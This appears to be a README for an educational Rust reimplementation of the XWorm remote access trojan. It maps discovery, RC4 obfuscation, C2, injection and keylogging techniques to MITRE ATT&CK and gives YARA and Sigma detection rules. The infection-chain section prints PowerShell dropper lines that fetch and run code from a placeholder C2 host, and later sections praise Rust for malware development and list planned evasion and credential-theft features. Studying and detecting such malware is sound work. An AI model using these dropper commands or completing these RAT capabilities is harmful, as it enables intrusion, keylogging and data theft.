# Rust XWorm - Educational Malware Implementation

## Overview

This is an educational implementation of malware techniques observed in XWorm, based on analysis from Cofense's research article "[PythonRATLoader: The Proprietor of XWorm and Friends](https://cofense.com/blog/pythonratloader-the-proprietor-of-xworm-and-friends)".

**⚠️ WARNING**: This implementation is for **AUTHORIZED SECURITY RESEARCH AND EDUCATION ONLY**. Unauthorized use is illegal and unethical.

## Project Structure

```
src/malware/rust-xworm/
├── Cargo.toml          # Dependencies and project configuration
└── src/
    └── main.rs         # All modules and implementation
```

## XWorm Background

XWorm is a commodity Remote Access Trojan (RAT) distributed via phishing campaigns. The original attack chain uses:

1. **Phishing Email** → Malicious link disguised as invoice
2. **Internet Shortcut** (.lnk) → Downloaded via WebDAV over Cloudflare tunnel
3. **PowerShell Script** → Masquerading as PDF
4. **Batch Script** (`corn.bat`) → Downloads Python payload
5. **Python 3.12 Package** → Deploys multiple RATs (XWorm, VenomRAT, DCRAT)

## MITRE ATT&CK Techniques Implemented

### T1547: Boot or Logon Autostart Execution

**Description**: XWorm establishes persistence via Windows Registry Run keys.

**Implementation**:

```rust
// Registry path: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
// Creates entry to execute on user login
```

**Detection**:

- Monitor registry key creation in Run/RunOnce keys
- Alert on suspicious executables in user directories
- Behavioral analysis of startup items

**Mitigation**:

- Restrict registry write permissions
- Application whitelisting
- Regular audits of autostart locations

---

### T1055.004: Process Injection (Early Bird APC Injection)

**Description**: Creates a suspended process (notepad.exe) and injects malicious code before the thread begins execution.

**Technique Flow**:

1. `CreateProcess` with `CREATE_SUSPENDED` flag
2. `VirtualAllocEx` to allocate RWX memory in target process
3. `WriteProcessMemory` to write shellcode
4. `QueueUserAPC` to queue shellcode execution
5. `ResumeThread` to trigger APC before any other code runs

**Why It's Effective**:

- Bypasses AV solutions that monitor running processes
- Code executes before the process initializes its security
- Memory allocation happens before process monitoring

**Detection**:

- Monitor for processes created in suspended state
- Track memory allocations with RWX permissions
- Behavioral analysis of QueueUserAPC calls
- EDR solutions with APC monitoring

**Code Reference**: [main.rs:207-234](../../src/malware/rust-xworm/src/main.rs#L207-L234)

---

### T1057: Process Discovery

**Description**: Enumerates running processes to identify security tools, analysis environments, or potential targets.

**Implementation**:

```rust
pub fn enumerate_processes() -> Vec<ProcessInfo> {
    let mut sys = System::new();
    sys.refresh_processes();

    sys.processes()
        .iter()
        .map(|(pid, process)| ProcessInfo {
            pid: pid.as_u32(),
            name: process.name().to_string(),
        })
        .collect()
}
```

**What XWorm Looks For**:

- Antivirus processes (Defender, Norton, etc.)
- Analysis tools (Process Monitor, Wireshark, etc.)
- Sandbox indicators (VBoxService, vmtoolsd, etc.)
- Valuable targets for injection

**Detection**:

- Unusual process enumeration patterns
- Repeated calls to process listing APIs
- Correlation with other suspicious activities

**Code Reference**: [main.rs:178-190](../../src/malware/rust-xworm/src/main.rs#L178-L190)

---

### T1087: Account Discovery

**Description**: Gathers account information present on the victim machine.

**Implementation**:

```rust
pub fn get_current_user_info() -> String {
    let users = Users::new_with_refreshed_list();
    let current_user = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "Unknown".to_string());

    format!(
        "Current User: {}\nTotal Users: {}",
        current_user,
        users.list().len()
    )
}
```

**Information Gathered**:

- Current user context (admin vs. standard user)
- List of all user accounts
- User privileges and group memberships
- Domain information (if domain-joined)

**Why It Matters**:

- Determines privilege escalation needs
- Identifies high-value targets
- Informs lateral movement strategy

**Code Reference**: [main.rs:192-204](../../src/malware/rust-xworm/src/main.rs#L192-L204)

---

### T1082: System Information Discovery

**Description**: Collects system information for fingerprinting and capability assessment.

**Implementation**:

```rust
pub fn gather_system_info() -> String {
    let mut sys = System::new_all();
    sys.refresh_all();

    // Gathers: OS name, version, kernel, hostname, CPU, memory
}
```

**Information Collected**:

- Operating System name and version
- Kernel version
- Hostname
- CPU architecture and core count
- Total and available memory
- Installed software

**Operator Benefits**:

- Target profiling for exploit selection
- Resource availability for payload execution
- Network identification via hostname
- Sandbox detection (low memory/CPU indicators)

**Code Reference**: [main.rs:158-176](../../src/malware/rust-xworm/src/main.rs#L158-L176)

---

### T1056.001: Input Capture (Keylogging)

**Description**: Captures keyboard input to steal credentials, messages, and sensitive data.

**Windows API Approach**:

```rust
// XWorm uses GetAsyncKeyState in a loop
for vk_code in 0..256 {
    if GetAsyncKeyState(vk_code) & 0x8000 != 0 {
        // Key is pressed, log it
    }
}
```

**What Gets Captured**:

- Passwords and credentials
- Private messages and emails
- Banking information
- Corporate data and secrets

**Storage and Exfiltration**:

- Logs encrypted with RC4
- Buffered to reduce C2 traffic
- Timestamped with window context
- Exfiltrated periodically over encrypted channel

**Detection**:

- Monitor for GetAsyncKeyState loops
- Behavioral analysis of keyboard API usage
- Unusual file writes in user directories
- Network anomalies (periodic encrypted uploads)

**Code Reference**: [main.rs:113-117](../../src/malware/rust-xworm/src/main.rs#L113-L117)

---

### T1573: Encrypted Channel (C2 Communications)

**Description**: All C2 communications encrypted with RC4 over HTTPS.

**Implementation**:

```rust
pub enum Command {
    Download { url: String },
    Execute { command: String },
    Upload { path: String },
    SystemInfo,
    Keylog { duration_seconds: u64 },
}

pub struct C2Message {
    pub command: Command,
    pub timestamp: u64,
    pub machine_id: String,
}
```

**Communication Flow**:

1. Encrypt command/data with RC4
2. Send over HTTPS to C2 server
3. Receive encrypted response
4. Decrypt with RC4 and execute

**C2 Commands**:

- **DOWNLOAD**: Fetch additional payloads
- **EXECUTE**: Run commands/scripts
- **UPLOAD**: Exfiltrate files
- **SYSTEMINFO**: Refresh system fingerprint
- **KEYLOG**: Start/stop keylogger

**Network Indicators**:

- Cloudflare tunnel endpoints
- Regular HTTPS beacons
- Encrypted binary data (not standard HTTPS)
- Unusual User-Agent strings

**Code Reference**: [main.rs:254-297](../../src/malware/rust-xworm/src/main.rs#L254-L297)

---

### T1027: Obfuscated Files or Information (RC4 Encryption)

**Description**: Uses RC4 encryption to obfuscate payloads, configuration, and communications.

**Implementation**:

```rust
pub fn rc4_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut cipher = Rc4::new(key.into());
    let mut buffer = data.to_vec();
    cipher.apply_keystream(&mut buffer);
    buffer
}

pub fn rc4_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    // RC4 is symmetric
    rc4_encrypt(data, key)
}
```

**What Gets Encrypted**:

- Shellcode and payloads
- C2 configuration (IP, domain, port)
- Exfiltrated data (keylog, files)
- C2 commands and responses

**Why RC4**:

- Fast and lightweight
- Symmetric (same function for encrypt/decrypt)
- Small code footprint
- Sufficient for malware obfuscation

**Detection Challenges**:

- Encrypted strings bypass signature detection
- Payload remains hidden until runtime
- Network traffic appears encrypted/random

**Code Reference**: [main.rs:131-147](../../src/malware/rust-xworm/src/main.rs#L131-L147)

---

## Evasion Techniques

### 1. Early Bird APC Injection

**Evasion Benefit**: Code executes before process initialization, bypassing:

- DLL injection monitoring
- Process creation hooks
- Memory scanning at process start

### 2. RC4 Encryption

**Evasion Benefit**:

- Static signature evasion
- String obfuscation
- Network traffic encryption

### 3. KRAMER Obfuscator (Original Python)

**Technique**: Open-source Python obfuscator

- Variable name randomization
- Control flow obfuscation
- String encoding

### 4. Silent Execution

**Methods**:

- `windows_subsystem = "windows"` (no console)
- Hidden PowerShell windows
- Background service execution

### 5. WebDAV Protocol

**Evasion Benefit**:

- Leverages Windows Explorer's built-in WebDAV
- Appears as legitimate file access
- Bypasses some web filters
- Works through Cloudflare tunnels

---

## Infection Chain Analysis

### Stage 1: Phishing Email

```
Subject: Urgent Invoice Payment Required
Attachment: invoice_2024_final.pdf.lnk
```

**Technique**: Social engineering with urgency and authority

### Stage 2: Internet Shortcut (.lnk)

```
URL=https://principles-yours-respected-skirt.trycloudflare.com/dl/payload.ps1
```

**Technique**: WebDAV over Cloudflare tunnel, bypassing direct URL filtering

### Stage 3: PowerShell Dropper

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://[C2]/corn.bat')
```

**Technique**: Fileless execution, in-memory payload

### Stage 4: Batch Script (corn.bat)

```batch
@echo off
powershell -Command "Invoke-WebRequest -Uri 'http://[C2]/python.zip' -OutFile '%APPDATA%\update.zip'"
powershell -Command "Expand-Archive -Path '%APPDATA%\update.zip' -DestinationPath '%APPDATA%\Python'"
```

**Technique**: Multi-stage dropper, obfuscated with BatchShield

### Stage 5: Python Payload Package

```
%APPDATA%\Python\
├── xw.py       # XWorm RAT
├── xo.py       # VenomRAT
└── ch.py       # DCRAT
```

**Technique**: Multiple RATs for redundancy and different capabilities

### Rust Implementation: Direct Execution

Our Rust implementation skips the complex dropper chain and demonstrates the core techniques directly.

---

## Building and Running

### Prerequisites

```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Add Windows cross-compilation target (from macOS/Linux)
rustup target add x86_64-pc-windows-gnu
```

### Build Commands

```bash
# Navigate to project
cd src/malware/rust-xworm

# Build for current platform
cargo build --release

# Cross-compile for Windows (from macOS/Linux)
cargo build --release --target x86_64-pc-windows-gnu
```

### Running the Educational Demo

**IMPORTANT**: This demo requires explicit safe mode activation:

```bash
# Set environment variable to enable safe mode
export XWORM_SAFE_MODE=1

# Run the demo (macOS/Linux)
cargo run --release

# Run on Windows
set XWORM_SAFE_MODE=1
cargo run --release
```

**Without `XWORM_SAFE_MODE=1`, the program will refuse to run.**

### Expected Output

```
[*] Rust XWorm - Educational Malware Research
[*] Based on XWorm analysis by Cofense
[!] FOR AUTHORIZED SECURITY RESEARCH ONLY

[+] Running in SAFE MODE (demonstration only)

=== XWorm Technique Demonstrations ===

[1] System Information Discovery (T1082)
    Hostname: research-lab
    OS: macOS 14.5
    Kernel: 23.5.0
    CPU Cores: 8
    Memory: 8192 MB / 16384 MB

[2] Process Discovery (T1057)
    Found 342 running processes
    1. systemd (PID: 1)
    2. Terminal (PID: 1234)
    ... (showing first 5)

[3] Account Discovery (T1087)
    Current User: researcher
    Total Users: 3

[4] RC4 Encryption Demo (T1027 - Obfuscation)
    Original:  This is XWorm C2 communication
    Encrypted: SGVsbG8gV29ybGQ= (base64)
    Decrypted: This is XWorm C2 communication

[5] Persistence Technique Demo (T1547)
    XWorm uses Registry Run Keys for persistence:
    Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    Value: [malware_name] = [executable_path]
    [DEMO ONLY - Not actually creating registry entry]

[6] Early Bird APC Injection (T1055.004)
    Technique: Create suspended process → Queue APC → Resume
    Target: notepad.exe (common XWorm target)
    [DEMO ONLY - Not performing actual injection]

[7] Keylogging Capability (T1056.001)
    Uses GetAsyncKeyState to monitor keyboard input
    Logs stored in encrypted format for exfiltration
    [DEMO ONLY - Not capturing actual keystrokes]

[8] Encrypted C2 Channel (T1573)
    Protocol: HTTPS with RC4 encrypted payload
    Commands: Download, Execute, Upload, SystemInfo
    [DEMO ONLY - No actual C2 connection]

=== Demonstration Complete ===

[*] All techniques demonstrated safely without actual malicious activity
[*] See rust-xworm.md wiki for detailed analysis
```

---

## Detection and Defense

### Detection Strategies

#### 1. Network Monitoring

```
Indicators:
- Cloudflare tunnel connections
- Periodic HTTPS beacons
- Encrypted binary data over HTTPS
- Unusual User-Agent strings
```

#### 2. Endpoint Detection

```
Indicators:
- Processes created in suspended state
- RWX memory allocations
- QueueUserAPC calls
- Registry Run key modifications
- GetAsyncKeyState API loops
```

#### 3. File System Monitoring

```
Indicators:
- Executables in %APPDATA%
- Hidden files/directories
- Encrypted log files
- Suspicious PowerShell scripts
```

#### 4. Behavioral Analysis

```
Indicators:
- Process injection patterns
- Unusual system information queries
- Repeated process enumeration
- Persistent system modifications
```

### YARA Rules

```yara
rule XWorm_RC4_Crypto {
    meta:
        description = "Detects RC4 crypto routine in XWorm"
        author = "Security Research Team"
        date = "2024-11-26"

    strings:
        $rc4_key_schedule = { 8A 04 0A 02 C2 88 04 0A 8A 14 0A }
        $rc4_encrypt = { 8A 04 11 32 04 0A 88 04 39 }
        $str_xworm = "XWorm" nocase
        $str_c2_cmd = /DOWNLOAD|EXECUTE|UPLOAD|KEYLOG/ nocase

    condition:
        uint16(0) == 0x5A4D and
        (any of ($rc4*)) and
        (any of ($str*))
}

rule XWorm_Persistence {
    meta:
        description = "Detects XWorm persistence mechanism"

    strings:
        $reg_run = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide ascii
        $reg_runonce = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" wide ascii

    condition:
        any of them
}

rule XWorm_APC_Injection {
    meta:
        description = "Detects Early Bird APC injection technique"

    strings:
        $api_create_suspended = "CREATE_SUSPENDED" wide ascii
        $api_queue_apc = "QueueUserAPC" ascii
        $api_resume_thread = "ResumeThread" ascii
        $api_virtual_alloc = "VirtualAllocEx" ascii
        $api_write_memory = "WriteProcessMemory" ascii

    condition:
        3 of them
}
```

### Sigma Rules

```yaml
title: Early Bird APC Injection Detection
id: 12345678-1234-1234-1234-123456789abc
status: experimental
description: Detects processes created in suspended state followed by APC queueing
author: Security Research Team
date: 2024/11/26
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'CREATE_SUSPENDED'
    condition: selection
falsepositives:
    - Legitimate debuggers
    - Some installers
level: high
```

### Defensive Measures

#### 1. Application Whitelisting

- Implement AppLocker or Windows Defender Application Control
- Block execution from user-writable directories (%APPDATA%, %TEMP%)

#### 2. Registry Protection

- Monitor and alert on Run/RunOnce key modifications
- Use Group Policy to restrict registry write access

#### 3. PowerShell Hardening

- Enable PowerShell logging (Module, Script Block, Transcription)
- Implement PowerShell Constrained Language Mode
- Block unsigned PowerShell scripts

#### 4. Network Segmentation

- Block outbound connections to Cloudflare tunnels (if not business-critical)
- Implement DPI for encrypted traffic analysis
- Use DNS sinkholing for known C2 domains

#### 5. Endpoint Protection

- Deploy EDR with behavioral analysis
- Enable memory scanning and APC monitoring
- Implement process injection detection

#### 6. User Training

- Phishing awareness training
- Verify unexpected invoices through separate channels
- Report suspicious emails to security team

---

## Educational Value

This implementation demonstrates:

1. **Realistic Malware Techniques**: Based on actual threat intelligence
2. **MITRE ATT&CK Mapping**: Clear mapping to industry-standard framework
3. **Safe Research Environment**: Built-in safety mechanisms prevent misuse
4. **Detection Strategy**: Comprehensive detection and mitigation guidance
5. **Cross-Platform Development**: Rust's portability for security research

---

## Rust Advantages for Malware Development

### 1. Memory Safety

- No buffer overflows (unless using `unsafe`)
- Prevents common exploitation of the malware itself

### 2. Cross-Compilation

```bash
# Build for Windows from macOS/Linux
cargo build --target x86_64-pc-windows-gnu

# Build for Linux from Windows
cargo build --target x86_64-unknown-linux-gnu
```

### 3. Small Binary Size

```bash
# Optimized release build
cargo build --release
# Further optimization with stripping
strip target/release/rust-xworm
```

### 4. Performance

- No runtime overhead (unlike Python)
- Efficient system API calls
- Fast cryptographic operations

### 5. Obfuscation-Friendly

- Can be obfuscated with tools like `llvm-obfuscator`
- Control flow flattening
- String encryption

---

## Indicators of Compromise (IOCs)

### File Hashes (Educational Demo)

```
SHA256: [Generated after build]
MD5: [Generated after build]
```

### Registry Keys

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\XWormClient
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\XWormUpdate
```

### Network Indicators

```
User-Agent: Mozilla/5.0 (XWorm/1.0)
C2 Domains: *.trycloudflare.com
Protocols: HTTPS (port 443), WebDAV
```

### File System Artifacts

```
%APPDATA%\Microsoft\Windows\XWormClient.exe
%APPDATA%\Logs\system_*.dat (encrypted keylogs)
%TEMP%\update.zip
```

### Process Indicators

```
Parent: explorer.exe → Child: notepad.exe (suspended)
Command Line: powershell.exe -WindowStyle Hidden -Command "IEX..."
```

---

## Comparison: Python vs. Rust Implementation

| Aspect | Python (Original) | Rust (This Implementation) |
|--------|-------------------|----------------------------|
| **Binary Size** | ~15MB (with Python runtime) | ~2-5MB (static binary) |
| **Startup Time** | Slower (interpreter startup) | Instant (native binary) |
| **Detection** | Easier (Python signatures) | Harder (native code) |
| **Obfuscation** | KRAMER, PyArmor | LLVM obfuscation, packing |
| **Performance** | Moderate | Excellent |
| **Development** | Faster prototyping | Steeper learning curve |
| **Memory Safety** | Runtime errors | Compile-time guarantees |
| **Portability** | Requires Python runtime | Standalone executable |

---

## Legal and Ethical Considerations

### ⚠️ Legal Warning

This code is provided **EXCLUSIVELY FOR EDUCATIONAL PURPOSES** in authorized security research environments:

- ✅ Authorized penetration testing with written permission
- ✅ CTF competitions and security challenges
- ✅ Academic research in controlled lab environments
- ✅ Defensive security training and red team exercises
- ❌ **NEVER use against systems without explicit authorization**
- ❌ **Unauthorized access is illegal under CFAA and similar laws worldwide**

### Responsible Disclosure

If you discover vulnerabilities or detection bypasses during research:

1. Do not exploit in production environments
2. Document findings responsibly
3. Disclose to affected vendors through coordinated disclosure
4. Follow industry-standard disclosure timelines (typically 90 days)

---

## References

1. **Cofense Research**: [PythonRATLoader: The Proprietor of XWorm and Friends](https://cofense.com/blog/pythonratloader-the-proprietor-of-xworm-and-friends)
2. **MITRE ATT&CK Framework**: [https://attack.mitre.org/](https://attack.mitre.org/)
3. **Early Bird APC Injection**: [Cyberbit EDU](https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/)
4. **Windows API Documentation**: [Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/)
5. **RC4 Cipher**: [Wikipedia](https://en.wikipedia.org/wiki/RC4)

---

## Future Research Directions

1. **Evasion Enhancement**:
   - DLL sideloading techniques
   - Heaven's Gate (32-bit to 64-bit transitions)
   - PPID spoofing
   - ETW patching

2. **Additional Capabilities**:
   - Screen capture
   - Browser credential theft
   - Clipboard monitoring
   - Network packet interception

3. **Advanced C2**:
   - DNS tunneling
   - Steganography for data hiding
   - Domain generation algorithms (DGA)
   - P2P C2 communication

4. **Anti-Analysis**:
   - Debugger detection
   - VM/sandbox detection
   - Time-based evasion
   - Environmental keying

---

## Acknowledgments

- **Cofense Research Team**: For detailed XWorm analysis
- **MITRE Corporation**: For the ATT&CK framework
- **Rust Security Community**: For tools and best practices
- **Defensive Security Community**: For detection techniques and YARA/Sigma rules

---

## License

This educational implementation is provided under MIT License for research purposes only. See LICENSE file for details.

**Disclaimer**: The authors assume no liability for misuse of this educational material. Users are solely responsible for ensuring their use complies with all applicable laws and regulations.

---

*Last Updated: 2024-11-26*
*Version: 1.0*
